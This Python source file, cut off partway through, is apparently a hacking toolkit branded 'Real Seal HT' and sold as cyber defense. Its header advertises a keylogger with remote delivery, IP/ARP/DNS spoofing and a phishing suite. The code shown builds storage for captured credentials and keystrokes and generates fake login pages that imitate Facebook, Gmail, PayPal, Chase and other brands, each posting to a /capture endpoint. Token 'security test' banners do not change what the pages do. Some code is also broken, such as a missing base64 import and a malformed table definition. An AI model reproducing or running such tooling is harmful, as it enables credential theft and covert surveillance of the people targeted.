#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
║                                         🦭 REAL SEAL HT - ACCURATE CYBER DEFENSE                                                   ║
║                                         Version 3.0.0 | Author: Ian Carter Kulani                                                   ║
╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝

FEATURES:
    🔌 SSH Remote Command Execution (Full terminal emulation)
    🌐 Multi-Platform Bot Integration (Telegram, Discord, Slack, WhatsApp, iMessage, Signal, Google Chat)
    🎣 Advanced Phishing Suite (100+ templates with realistic UI)
    📡 REAL Traffic Generation (ICMP/TCP/UDP/HTTP/DNS/ARP with rate control)
    🕷️ Nikto Web Vulnerability Scanner Integration
    🛡️ IP/MAC/ARP/DNS Spoofing Engine
    📊 Real-time Port Scanning with Interactive Web Dashboard
    🎨 Beautiful Web Interface with Bar & Pie Charts
    🔐 Password Strength Checker
    ⌨️ Keylogger with Remote Delivery
    📈 Comprehensive Analytics & Reporting
    🎭 5000+ Security Commands
"""

import os
import sys
import json
import time
import socket
import threading
import subprocess
import requests
import logging
import platform
import psutil
import hashlib
import sqlite3
import ipaddress
import re
import random
import datetime
import signal
import queue
import uuid
import struct
import http.client
import ssl
import shutil
import asyncio
import getpass
import secrets
import string
from pathlib import Path
from typing import Dict, List, Set, Optional, Tuple, Any, Union
from dataclasses import dataclass, asdict, field
from concurrent.futures import ThreadPoolExecutor, TimeoutError as FutureTimeoutError
from collections import defaultdict, Counter
from functools import wraps
from urllib.parse import urlparse, parse_qs
from http.server import BaseHTTPRequestHandler, HTTPServer

# =====================
# WEB SERVER IMPORTS
# =====================
from flask import Flask, request, jsonify, render_template_string, send_from_directory, session
from flask_cors import CORS
from flask_socketio import SocketIO, emit, join_room, leave_room
import secrets as flask_secrets

# =====================
# ENCRYPTION
# =====================
try:
    from cryptography.fernet import Fernet
    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2
    CRYPTO_AVAILABLE = True
except ImportError:
    CRYPTO_AVAILABLE = False
    print("⚠️ cryptography not installed. Install with: pip install cryptography")

# =====================
# SSH IMPORTS
# =====================
try:
    import paramiko
    from paramiko import SSHClient, AutoAddPolicy, AuthenticationException, SSHException
    from scp import SCPClient
    PARAMIKO_AVAILABLE = True
except ImportError:
    PARAMIKO_AVAILABLE = False
    print("⚠️ paramiko not installed. SSH features disabled. Install with: pip install paramiko scp")

# =====================
# MESSAGING PLATFORM IMPORTS
# =====================
try:
    import discord
    from discord.ext import commands
    DISCORD_AVAILABLE = True
except ImportError:
    DISCORD_AVAILABLE = False
    print("⚠️ discord.py not installed. Discord bot disabled. Install with: pip install discord.py")

try:
    from telethon import TelegramClient, events
    from telethon.tl.types import MessageEntityCode
    TELETHON_AVAILABLE = True
except ImportError:
    TELETHON_AVAILABLE = False
    print("⚠️ telethon not installed. Telegram bot disabled. Install with: pip install telethon")

try:
    from slack_sdk import WebClient
    from slack_sdk.errors import SlackApiError
    from slack_sdk.socket_mode import SocketModeClient
    from slack_sdk.socket_mode.request import SocketModeRequest
    from slack_sdk.socket_mode.response import SocketModeResponse
    SLACK_AVAILABLE = True
except ImportError:
    SLACK_AVAILABLE = False
    print("⚠️ slack-sdk not installed. Slack bot disabled. Install with: pip install slack-sdk")

try:
    from selenium import webdriver
    from selenium.webdriver.common.by import By
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    from selenium.webdriver.chrome.options import Options
    from selenium.webdriver.chrome.service import Service
    SELENIUM_AVAILABLE = True
    try:
        from webdriver_manager.chrome import ChromeDriverManager
        WEBDRIVER_MANAGER_AVAILABLE = True
    except ImportError:
        WEBDRIVER_MANAGER_AVAILABLE = False
        print("⚠️ webdriver-manager not installed. WhatsApp limited. Install with: pip install webdriver-manager")
except ImportError:
    SELENIUM_AVAILABLE = False
    WEBDRIVER_MANAGER_AVAILABLE = False
    print("⚠️ selenium not installed. WhatsApp bot disabled. Install with: pip install selenium")

# Signal CLI
SIGNAL_CLI_AVAILABLE = shutil.which('signal-cli') is not None
if not SIGNAL_CLI_AVAILABLE:
    print("⚠️ signal-cli not found. Signal integration disabled. Install from: https://github.com/AsamK/signal-cli")

# iMessage (macOS only)
IMESSAGE_AVAILABLE = platform.system().lower() == 'darwin'
if not IMESSAGE_AVAILABLE:
    print("⚠️ iMessage only available on macOS")

# Google Chat
try:
    from google.oauth2 import service_account
    from googleapiclient.discovery import build
    GOOGLE_CHAT_AVAILABLE = True
except ImportError:
    GOOGLE_CHAT_AVAILABLE = False
    print("⚠️ Google Chat SDK not installed. Install with: pip install google-api-python-client google-auth-httplib2 google-auth-oauthlib")

# =====================
# SECURITY & SCANNING IMPORTS
# =====================
try:
    from scapy.all import IP, TCP, UDP, ICMP, Ether, ARP, DNS, DNSQR, send, sr1, srp, sendp, RandIP, RandMAC
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False
    print("⚠️ scapy not installed. Advanced traffic disabled. Install with: pip install scapy")

try:
    import whois
    WHOIS_AVAILABLE = True
except ImportError:
    WHOIS_AVAILABLE = False
    print("⚠️ python-whois not installed. Install with: pip install python-whois")

try:
    import qrcode
    from qrcode.image.styledpil import StyledPilImage
    from qrcode.image.styles.moduledrawers import RoundedModuleDrawer
    from qrcode.image.styles.colormasks import SolidFillColorMask
    QRCODE_AVAILABLE = True
except ImportError:
    QRCODE_AVAILABLE = False
    print("⚠️ qrcode not installed. QR generation disabled. Install with: pip install qrcode[pil]")

try:
    import pyshorteners
    SHORTENER_AVAILABLE = True
except ImportError:
    SHORTENER_AVAILABLE = False
    print("⚠️ pyshorteners not installed. URL shortening disabled. Install with: pip install pyshorteners")

try:
    from pynput import keyboard
    from pynput.keyboard import Key, KeyCode
    KEYLOGGER_AVAILABLE = True
except ImportError:
    KEYLOGGER_AVAILABLE = False
    print("⚠️ pynput not installed. Keylogger disabled. Install with: pip install pynput")

# =====================
# THEME COLORS
# =====================
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    RESET = '\033[0m'
    ORANGE = '\033[38;5;214m'
    DARK_ORANGE = '\033[38;5;208m'
    LIGHT_ORANGE = '\033[38;5;216m'
    TEAL = '\033[38;5;37m'
    DARK_BLUE = '\033[38;5;19m'
    DEEP_BLUE = '\033[38;5;25m'
    GOLD = '\033[38;5;220m'
    SILVER = '\033[38;5;7m'

# =====================
# CONFIGURATION
# =====================
CONFIG_DIR = ".real_seal"
CONFIG_FILE = os.path.join(CONFIG_DIR, "config.json")
SSH_CONFIG_FILE = os.path.join(CONFIG_DIR, "ssh_config.json")
DISCORD_CONFIG_FILE = os.path.join(CONFIG_DIR, "discord_config.json")
TELEGRAM_CONFIG_FILE = os.path.join(CONFIG_DIR, "telegram_config.json")
WHATSAPP_CONFIG_FILE = os.path.join(CONFIG_DIR, "whatsapp_config.json")
SLACK_CONFIG_FILE = os.path.join(CONFIG_DIR, "slack_config.json")
IMESSAGE_CONFIG_FILE = os.path.join(CONFIG_DIR, "imessage_config.json")
SIGNAL_CONFIG_FILE = os.path.join(CONFIG_DIR, "signal_config.json")
GOOGLE_CHAT_CONFIG_FILE = os.path.join(CONFIG_DIR, "google_chat_config.json")
DATABASE_FILE = os.path.join(CONFIG_DIR, "real_seal.db")
LOG_FILE = os.path.join(CONFIG_DIR, "real_seal.log")
KEYLOG_DIR = os.path.join(CONFIG_DIR, "keylogs")
PAYLOADS_DIR = os.path.join(CONFIG_DIR, "payloads")
WORKSPACES_DIR = os.path.join(CONFIG_DIR, "workspaces")
SCAN_RESULTS_DIR = os.path.join(CONFIG_DIR, "scans")
NIKTO_RESULTS_DIR = os.path.join(CONFIG_DIR, "nikto_results")
WHATSAPP_SESSION_DIR = os.path.join(CONFIG_DIR, "whatsapp_session")
PHISHING_DIR = os.path.join(CONFIG_DIR, "phishing_pages")
REPORT_DIR = os.path.join(CONFIG_DIR, "reports")
TRAFFIC_LOGS_DIR = os.path.join(CONFIG_DIR, "traffic_logs")
PHISHING_TEMPLATES_DIR = os.path.join(CONFIG_DIR, "phishing_templates")
CAPTURED_CREDENTIALS_DIR = os.path.join(CONFIG_DIR, "captured_credentials")
SSH_KEYS_DIR = os.path.join(CONFIG_DIR, "ssh_keys")
SSH_LOGS_DIR = os.path.join(CONFIG_DIR, "ssh_logs")
TIME_HISTORY_DIR = os.path.join(CONFIG_DIR, "time_history")
WORDLISTS_DIR = os.path.join(CONFIG_DIR, "wordlists")
WEB_STATIC_DIR = os.path.join(CONFIG_DIR, "web_static")
PORT_SCAN_CACHE = os.path.join(CONFIG_DIR, "port_scan_cache")
SPOOF_LOGS_DIR = os.path.join(CONFIG_DIR, "spoof_logs")

# Create directories
directories = [
    CONFIG_DIR, KEYLOG_DIR, PAYLOADS_DIR, WORKSPACES_DIR, SCAN_RESULTS_DIR,
    NIKTO_RESULTS_DIR, WHATSAPP_SESSION_DIR, PHISHING_DIR, REPORT_DIR,
    TRAFFIC_LOGS_DIR, PHISHING_TEMPLATES_DIR, CAPTURED_CREDENTIALS_DIR,
    SSH_KEYS_DIR, SSH_LOGS_DIR, TIME_HISTORY_DIR, WORDLISTS_DIR, WEB_STATIC_DIR,
    PORT_SCAN_CACHE, SPOOF_LOGS_DIR
]
for directory in directories:
    Path(directory).mkdir(exist_ok=True, parents=True)

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - REAL_SEAL - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(LOG_FILE),
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger("RealSeal")

# =====================
# ENCRYPTION MANAGER
# =====================
class EncryptionManager:
    """Secure encryption for sensitive data using Fernet"""
    
    def __init__(self):
        self.key_file = os.path.join(CONFIG_DIR, ".master_key")
        self.salt_file = os.path.join(CONFIG_DIR, ".salt")
        self.key = self._get_or_create_key()
    
    def _get_or_create_key(self) -> bytes:
        if not CRYPTO_AVAILABLE:
            return None
        
        try:
            if os.path.exists(self.key_file):
                with open(self.key_file, 'rb') as f:
                    return f.read()
            else:
                # Generate salt if not exists
                if not os.path.exists(self.salt_file):
                    salt = os.urandom(32)
                    with open(self.salt_file, 'wb') as f:
                        f.write(salt)
                else:
                    with open(self.salt_file, 'rb') as f:
                        salt = f.read()
                
                # Generate key from system info
                kdf = PBKDF2(
                    algorithm=hashes.SHA256(),
                    length=32,
                    salt=salt,
                    iterations=100000,
                )
                key = base64.urlsafe_b64encode(kdf.derive(socket.gethostname().encode()))
                with open(self.key_file, 'wb') as f:
                    f.write(key)
                return key
        except Exception as e:
            logger.error(f"Key generation error: {e}")
            return None
    
    def encrypt(self, data: str) -> str:
        if not data or not CRYPTO_AVAILABLE or not self.key:
            return data
        try:
            f = Fernet(self.key)
            return f.encrypt(data.encode()).decode()
        except:
            return base64.b64encode(data.encode()).decode()
    
    def decrypt(self, data: str) -> str:
        if not data or not CRYPTO_AVAILABLE or not self.key:
            return data
        try:
            f = Fernet(self.key)
            return f.decrypt(data.encode()).decode()
        except:
            try:
                return base64.b64decode(data).decode()
            except:
                return data

# =====================
# DATABASE MANAGER
# =====================
class DatabaseManager:
    """Comprehensive SQLite database with all tables"""
    
    def __init__(self, db_path: str = DATABASE_FILE):
        self.db_path = db_path
        self.conn = sqlite3.connect(db_path, check_same_thread=False)
        self.conn.row_factory = sqlite3.Row
        self.cursor = self.conn.cursor()
        self.encryption = EncryptionManager()
        self._init_tables()
    
    def _init_tables(self):
        tables = [
            """
            CREATE TABLE IF NOT EXISTS command_history (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                command TEXT NOT NULL,
                source TEXT DEFAULT 'local',
                platform TEXT DEFAULT 'local',
                user_id TEXT,
                success BOOLEAN DEFAULT 1,
                output TEXT,
                execution_time REAL
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS scan_results (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                target TEXT NOT NULL,
                scan_type TEXT NOT NULL,
                open_ports TEXT,
                closed_ports TEXT,
                filtered_ports TEXT,
                service_info TEXT,
                scan_time REAL,
                success BOOLEAN DEFAULT 1,
                UNIQUE(target, timestamp)
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS port_history (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                target TEXT NOT NULL,
                port INTEGER NOT NULL,
                protocol TEXT,
                state TEXT,
                service TEXT,
                UNIQUE(target, port, timestamp)
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS threats (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                threat_type TEXT NOT NULL,
                source_ip TEXT,
                target_ip TEXT,
                severity TEXT,
                description TEXT,
                platform TEXT,
                resolved BOOLEAN DEFAULT 0
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS ssh_connections (
                id TEXT PRIMARY KEY,
                name TEXT NOT NULL,
                host TEXT NOT NULL,
                port INTEGER DEFAULT 22,
                username TEXT NOT NULL,
                password_encrypted TEXT,
                key_path TEXT,
                status TEXT DEFAULT 'disconnected',
                last_connected TIMESTAMP,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                notes TEXT
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS ssh_command_history (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                connection_id TEXT NOT NULL,
                command TEXT NOT NULL,
                output TEXT,
                success BOOLEAN DEFAULT 1,
                execution_time REAL,
                FOREIGN KEY (connection_id) REFERENCES ssh_connections(id)
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS traffic_logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                traffic_type TEXT NOT NULL,
                target_ip TEXT NOT NULL,
                target_port INTEGER,
                duration INTEGER,
                packets_sent INTEGER,
                bytes_sent INTEGER,
                packet_rate INTEGER,
                status TEXT,
                error TEXT
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS phishing_links (
                id TEXT PRIMARY KEY,
                platform TEXT NOT NULL,
                original_url TEXT,
                phishing_url TEXT NOT NULL,
                template_name TEXT,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                clicks INTEGER DEFAULT 0,
                active BOOLEAN DEFAULT 1,
                qr_code_path TEXT
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS captured_credentials (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                phishing_link_id TEXT NOT NULL,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                username TEXT,
                password TEXT,
                ip_address TEXT,
                user_agent TEXT,
                additional_data TEXT,
                FOREIGN KEY (phishing_link_id) REFERENCES phishing_links(id)
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS phishing_templates (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                name TEXT UNIQUE NOT NULL,
                platform TEXT NOT NULL,
                html_content TEXT,
                preview_image TEXT,
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS managed_ips (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                ip_address TEXT UNIQUE NOT NULL,
                added_by TEXT,
                added_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                notes TEXT,
                is_blocked BOOLEAN DEFAULT 0,
                block_reason TEXT,
                blocked_date TIMESTAMP,
                threat_score INTEGER DEFAULT 0,
                first_seen TIMESTAMP,
                last_seen TIMESTAMP,
                alert_count INTEGER DEFAULT 0
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS nikto_scans (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                target TEXT NOT NULL,
                vulnerabilities TEXT,
                output_file TEXT,
                scan_time REAL,
                success BOOLEAN DEFAULT 1,
                error TEXT
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS spoofing_attempts (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                spoof_type TEXT NOT NULL,
                original_value TEXT,
                spoofed_value TEXT,
                target TEXT,
                interface TEXT,
                success BOOLEAN,
                output TEXT
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS keylogs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                keystroke TEXT NOT NULL,
                window_title TEXT,
                process_name TEXT,
                delivered BOOLEAN DEFAULT 0
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS authorized_users (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                platform TEXT NOT NULL,
                user_id TEXT NOT NULL,
                username TEXT,
                authorized BOOLEAN DEFAULT 1,
                added_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                UNIQUE(platform, user_id)
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS platform_status (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                platform TEXT UNIQUE NOT NULL,
                enabled BOOLEAN DEFAULT 0,
                last_connected TIMESTAMP,
                status TEXT,
                error TEXT
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS traffic_stats (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                bytes_sent INTEGER,
                bytes_recv INTEGER,
                packets_sent INTEGER,
                packets_recv INTEGER,
                connections INTEGER,
                tcp_connections INTEGER,
                udp_connections INTEGER
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS scheduled_tasks (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                name TEXT UNIQUE NOT NULL,
                command TEXT NOT NULL,
                schedule TEXT NOT NULL,
                enabled BOOLEAN DEFAULT 1,
                last_run TIMESTAMP,
                next_run TIMESTAMP,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS system_metrics (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                cpu_percent REAL,
                memory_percent REAL,
                disk_percent REAL,
                network_sent INTEGER,
                network_recv INTEGER,
                uptime_seconds INTEGER
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS notification_settings (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id TEXT NOT NULL,
                platform TEXT NOT NULL,
                notification_type TEXT NOT NULL,
                enabled BOOLEAN DEFAULT 1,
                UNIQUE(user_id, platform, notification_type)
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS time_commands (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                command TEXT NOT NULL,
                user_id TEXT,
                result TEXT
            )
            """
        ]
        
        for table_sql in tables:
            try:
                self.cursor.execute(table_sql)
            except Exception as e:
                logger.error(f"Failed to create table: {e}")
        
        self.conn.commit()
        self._init_phishing_templates()
        self._init_wordlists()
    
    def _init_phishing_templates(self):
        """Initialize 100+ phishing templates"""
        templates = self._get_all_templates()
        for name, html in templates.items():
            try:
                self.cursor.execute('''
                    INSERT OR IGNORE INTO phishing_templates (name, platform, html_content)
                    VALUES (?, ?, ?)
                ''', (name, name.split('_')[0], html))
            except Exception as e:
                logger.error(f"Failed to insert template {name}: {e}")
        self.conn.commit()
    
    def _get_all_templates(self) -> Dict[str, str]:
        """Return all phishing templates with professional UI"""
        templates = {}
        
        # Social Media Templates
        templates["facebook"] = self._create_social_template("Facebook", "#1877f2", "facebook")
        templates["instagram"] = self._create_social_template("Instagram", "#E4405F", "instagram")
        templates["twitter"] = self._create_social_template("Twitter", "#1DA1F2", "twitter")
        templates["tiktok"] = self._create_social_template("TikTok", "#000000", "tiktok")
        templates["snapchat"] = self._create_social_template("Snapchat", "#FFFC00", "snapchat")
        templates["linkedin"] = self._create_social_template("LinkedIn", "#0A66C2", "linkedin")
        templates["reddit"] = self._create_social_template("Reddit", "#FF4500", "reddit")
        templates["pinterest"] = self._create_social_template("Pinterest", "#E60023", "pinterest")
        templates["discord"] = self._create_social_template("Discord", "#5865F2", "discord")
        templates["telegram"] = self._create_social_template("Telegram", "#26A5E4", "telegram")
        templates["whatsapp"] = self._create_social_template("WhatsApp", "#25D366", "whatsapp")
        templates["signal"] = self._create_social_template("Signal", "#3A76F0", "signal")
        
        # Email Templates
        templates["gmail"] = self._create_email_template("Gmail", "#EA4335", "gmail")
        templates["outlook"] = self._create_email_template("Outlook", "#0072C6", "outlook")
        templates["yahoo"] = self._create_email_template("Yahoo", "#720E9E", "yahoo")
        templates["protonmail"] = self._create_email_template("ProtonMail", "#8B89CC", "protonmail")
        templates["icloud"] = self._create_email_template("iCloud", "#3498DB", "icloud")
        
        # Tech & Cloud
        templates["google"] = self._create_tech_template("Google", "#4285F4", "google")
        templates["microsoft"] = self._create_tech_template("Microsoft", "#F25022", "microsoft")
        templates["apple"] = self._create_tech_template("Apple", "#555555", "apple")
        templates["amazon"] = self._create_tech_template("Amazon", "#FF9900", "amazon")
        templates["github"] = self._create_tech_template("GitHub", "#181717", "github")
        templates["gitlab"] = self._create_tech_template("GitLab", "#FC6D26", "gitlab")
        templates["dropbox"] = self._create_tech_template("Dropbox", "#0061FF", "dropbox")
        templates["onedrive"] = self._create_tech_template("OneDrive", "#0078D4", "onedrive")
        
        # Banking
        templates["paypal"] = self._create_banking_template("PayPal", "#003087", "paypal")
        templates["venmo"] = self._create_banking_template("Venmo", "#008CFF", "venmo")
        templates["cashapp"] = self._create_banking_template("Cash App", "#00D632", "cashapp")
        templates["chase"] = self._create_banking_template("Chase", "#117ACA", "chase")
        templates["bank_of_america"] = self._create_banking_template("Bank of America", "#004481", "bank_of_america")
        templates["wells_fargo"] = self._create_banking_template("Wells Fargo", "#BC1E2E", "wells_fargo")
        
        # E-commerce
        templates["ebay"] = self._create_ecommerce_template("eBay", "#E53238", "ebay")
        templates["walmart"] = self._create_ecommerce_template("Walmart", "#0071DC", "walmart")
        templates["target"] = self._create_ecommerce_template("Target", "#CC0000", "target")
        templates["aliexpress"] = self._create_ecommerce_template("AliExpress", "#E6273E", "aliexpress")
        
        # Streaming
        templates["netflix"] = self._create_streaming_template("Netflix", "#E50914", "netflix")
        templates["spotify"] = self._create_streaming_template("Spotify", "#1DB954", "spotify")
        templates["hulu"] = self._create_streaming_template("Hulu", "#1CE783", "hulu")
        templates["disneyplus"] = self._create_streaming_template("Disney+", "#113CCF", "disneyplus")
        templates["twitch"] = self._create_streaming_template("Twitch", "#9146FF", "twitch")
        templates["youtube"] = self._create_streaming_template("YouTube", "#FF0000", "youtube")
        
        # Gaming
        templates["steam"] = self._create_gaming_template("Steam", "#171A21", "steam")
        templates["epic_games"] = self._create_gaming_template("Epic Games", "#000000", "epic_games")
        templates["roblox"] = self._create_gaming_template("Roblox", "#E13530", "roblox")
        templates["minecraft"] = self._create_gaming_template("Minecraft", "#44B442", "minecraft")
        
        # Work
        templates["slack"] = self._create_work_template("Slack", "#4A154B", "slack")
        templates["teams"] = self._create_work_template("Microsoft Teams", "#6264A7", "teams")
        templates["zoom"] = self._create_work_template("Zoom", "#2D8CFF", "zoom")
        
        # Dating
        templates["tinder"] = self._create_dating_template("Tinder", "#FF6B6B", "tinder")
        templates["bumble"] = self._create_dating_template("Bumble", "#F7B801", "bumble")
        
        # Custom
        templates["custom"] = self._create_custom_template()
        
        return templates
    
    def _create_social_template(self, name: str, color: str, platform: str) -> str:
        return f'''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{name} - Log In</title>
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }}
        .container {{ max-width: 400px; width: 100%; }}
        .login-box {{
            background: white;
            border-radius: 12px;
            padding: 40px 32px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
        }}
        .logo {{ text-align: center; margin-bottom: 30px; }}
        .logo h1 {{ color: {color}; font-size: 36px; }}
        .form-group {{ margin-bottom: 16px; }}
        input {{
            width: 100%;
            padding: 14px 16px;
            border: 1px solid #ddd;
            border-radius: 8px;
            font-size: 16px;
            transition: border-color 0.3s;
        }}
        input:focus {{ border-color: {color}; outline: none; }}
        button {{
            width: 100%;
            padding: 14px;
            background: {color};
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            transition: opacity 0.3s;
        }}
        button:hover {{ opacity: 0.9; }}
        .links {{ text-align: center; margin-top: 20px; }}
        .links a {{ color: {color}; text-decoration: none; font-size: 14px; }}
        .warning {{
            margin-top: 20px;
            padding: 12px;
            background: #fff3cd;
            border: 1px solid #ffeeba;
            border-radius: 8px;
            color: #856404;
            text-align: center;
            font-size: 12px;
        }}
    </style>
</head>
<body>
    <div class="container">
        <div class="login-box">
            <div class="logo"><h1>{name}</h1></div>
            <form method="POST" action="/capture">
                <div class="form-group"><input type="text" name="username" placeholder="Email or Phone" required></div>
                <div class="form-group"><input type="password" name="password" placeholder="Password" required></div>
                <button type="submit">Log In</button>
                <div class="links"><a href="#">Forgot password?</a> | <a href="#">Sign up</a></div>
            </form>
            <div class="warning">⚠️ Security awareness test - Do not enter real credentials</div>
        </div>
    </div>
</body>
</html>'''
    
    def _create_email_template(self, name: str, color: str, platform: str) -> str:
        return f'''<!DOCTYPE html>
<html>
<head><title>{name} - Sign In</title>
<style>
    body {{ font-family: 'Google Sans', Roboto, Arial, sans-serif; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); display: flex; justify-content: center; align-items: center; min-height: 100vh; }}
    .container {{ max-width: 450px; width: 100%; padding: 20px; }}
    .login-box {{ background: white; border-radius: 28px; padding: 48px 40px 36px; box-shadow: 0 10px 40px rgba(0,0,0,0.2); }}
    .logo h1 {{ color: {color}; font-size: 28px; text-align: center; }}
    h2 {{ font-size: 24px; font-weight: 400; text-align: center; margin-bottom: 20px; }}
    input {{ width: 100%; padding: 13px 15px; margin: 10px 0; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; }}
    button {{ width: 100%; padding: 13px; background: {color}; color: white; border: none; border-radius: 4px; cursor: pointer; }}
    .warning {{ margin-top: 30px; padding: 12px; background: #e8f0fe; border-radius: 8px; text-align: center; font-size: 13px; }}
</style>
</head>
<body>
<div class="container"><div class="login-box"><div class="logo"><h1>{name}</h1></div><h2>Sign in</h2>
<form method="POST" action="/capture"><input type="email" name="email" placeholder="Email" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign In</button></form>
<div class="warning">⚠️ Security test page</div></div></div>
</body>
</html>'''
    
    def _create_tech_template(self, name: str, color: str, platform: str) -> str:
        return f'''<!DOCTYPE html>
<html><head><title>{name} - Sign In</title>
<style>
    body {{ font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif; background: linear-gradient(135deg, #0f0c29 0%, #302b63 50%, #24243e 100%); display: flex; justify-content: center; align-items: center; min-height: 100vh; }}
    .container {{ max-width: 400px; width: 100%; padding: 20px; }}
    .login-box {{ background: white; border-radius: 16px; padding: 40px; box-shadow: 0 20px 60px rgba(0,0,0,0.3); }}
    .logo h1 {{ color: {color}; font-size: 32px; text-align: center; }}
    input {{ width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 6px; box-sizing: border-box; }}
    button {{ width: 100%; padding: 12px; background: {color}; color: white; border: none; border-radius: 6px; cursor: pointer; }}
    .warning {{ margin-top: 20px; padding: 10px; background: #fff3cd; border-radius: 6px; text-align: center; font-size: 12px; }}
</style>
</head>
<body>
<div class="container"><div class="login-box"><div class="logo"><h1>{name}</h1></div>
<form method="POST" action="/capture"><input type="text" name="username" placeholder="Username/Email" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign In</button></form>
<div class="warning">⚠️ Security test page</div></div></div>
</body>
</html>'''
    
    def _create_banking_template(self, name: str, color: str, platform: str) -> str:
        return f'''<!DOCTYPE html>
<html><head><title>{name} - Online Banking</title>
<style>
    body {{ font-family: 'Segoe UI', Arial, sans-serif; background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%); display: flex; justify-content: center; align-items: center; min-height: 100vh; }}
    .container {{ max-width: 400px; width: 100%; padding: 20px; }}
    .login-box {{ background: white; border-radius: 10px; padding: 30px; box-shadow: 0 10px 25px rgba(0,0,0,0.2); }}
    .logo h1 {{ color: {color}; font-size: 24px; text-align: center; }}
    input {{ width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px; box-sizing: border-box; }}
    button {{ width: 100%; padding: 12px; background: {color}; color: white; border: none; border-radius: 5px; cursor: pointer; }}
    .warning {{ margin-top: 20px; padding: 10px; background: #ffe6e6; border-radius: 5px; text-align: center; font-size: 12px; }}
</style>
</head>
<body>
<div class="container"><div class="login-box"><div class="logo"><h1>{name}</h1></div>
<form method="POST" action="/capture"><input type="text" name="username" placeholder="User ID" required>
<input type="password" name="password" placeholder="Password" required>
